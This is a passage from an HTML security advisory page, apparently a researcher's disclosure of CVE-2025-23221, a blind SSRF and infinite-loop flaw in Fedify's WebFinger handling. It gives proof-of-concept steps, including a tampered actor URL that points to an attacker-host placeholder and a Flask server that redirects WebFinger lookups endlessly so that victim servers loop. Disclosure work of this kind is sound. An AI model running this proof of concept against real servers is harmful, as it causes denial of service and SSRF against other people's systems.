a \u003Cstrong\u003E\u003Cem\u003EskipSignatureVerification: true\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E attribute to the \u003Cstrong\u003E\u003Cem\u003EcreateFederation\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E object.\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"6\"\u003E\n\u003Cli\u003EModify the \u003Cstrong\u003E\u003Cem\u003E\u002Fsrc\u002Ffederation.ts\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E file and tamper with the Person object on the actor dispatcher ( \u003Cstrong\u003E\u003Cem\u003EsetActorDispatcher(\\\"\u002Fusers\u002F{identifier}\\\"\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E ) - change the actor ID attribute \u003Cstrong\u003E\u003Cem\u003E“id: ctx.getActorUri(identifier)\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E” into “\u003Cstrong\u003E\u003Cem\u003Eid: new URL(‘http:\u002F\u002F&#x3C;ATTACKER_MACHINE_DOMAIN\u003E:1337\u002Fusers\u002Fenterloop’)\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E”.\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"7\"\u003E\n\u003Cli\u003EInstall Python flask and create the Python Flask redirect server:\n\u003Ccode\u003Eapt update\u003C\u002Fcode\u003E\n\u003Ccode\u003Eapt install python3-flask\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-python\"\u003Efrom flask import Flask, redirect\n\napp = Flask(__name__)\n\n@app.route('\u002Fhealth')\ndef health():\n    return \\\"hello\\\", 200\n\n@app.route('\u002F.well-known\u002Fwebfinger')\ndef ssrfinger():\n    return redirect(\\\"http:\u002F\u002F&#x3C;ATTACKER_MACHINE_DOMAIN\u003E:1337\u002Fendlessloop\\\")\n\n@app.route('\u002Fendlessloop')\ndef endlessloop():\n    return redirect(\\\"http:\u002F\u002F&#x3C;ATTACKER_MACHINE_DOMAIN\u003E:1337\u002Fendlessloop\\\")\n\nif __name__ == '__main__':\n    app.run(debug=True,host='0.0.0.0' ,port=1337)\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Col start=\"8\"\u003E\n\u003Cli\u003ERun the python server and attempt to reach the “\u003Cstrong\u003E\u003Cem\u003E\u002Fhealth\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E” path to see the server functions as expected.\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"9\"\u003E\n\u003Cli\u003ERead the \u003Cstrong\u003E\u003Cem\u003EREADME.txt\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E file on the attacker app and follow the instructions on how to execute the app.\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"10\"\u003E\n\u003Cli\u003ESurf the app on the browser and attempt to follow the federated user on the victim’s machine.\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"11\"\u003E\n\u003Cli\u003ESend the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Ch2 id=\"vulnerability-mitigations\"\u003E\u003Ca href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\"\u003EVulnerability Mitigations\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003ENo mitigations are provided for this vulnerability.\u003C\u002Fp\u003E\n\u003Ch2 id=\"references\"\u003E\u003Ca href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\"\u003EReferences\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Fgithub.com\u002Ffedify-dev\u002Ffedify\u002Fsecurity\u002Fadvisories\u002FGHSA-c59p-wq67-24wx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003EGHSA\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n","description":"CVE-2025-23221 Medium severity. Infinite loop and Blind SSRF found inside the WebFinger mechanism","date_published":"2025-01-20","xray_id":"","vul_id":"CVE-2025-23221","severity":"medium","discovered_by":"Natan Nehorai","last_updated":"2025-01-20","cvss":5.4}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.35b5555f.js" defer></script><script src="/assets/js/page--src--templates--post-vue.d2ee2512.js" defer></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8" data-body="true">
    if (window.airgap) {
      const cookieSettings = document.getElementById('cookie_settings') || document.querySelector('.ot-sdk-show-settings');
      cookieSettings.href = "#";
      cookieSettings.target = "_self";
      cookieSettings.onclick = () => {
        transcend.showConsentManager({ viewState: 'CompleteOptions' });
      };
    }
  </script>
  </body>
</html>
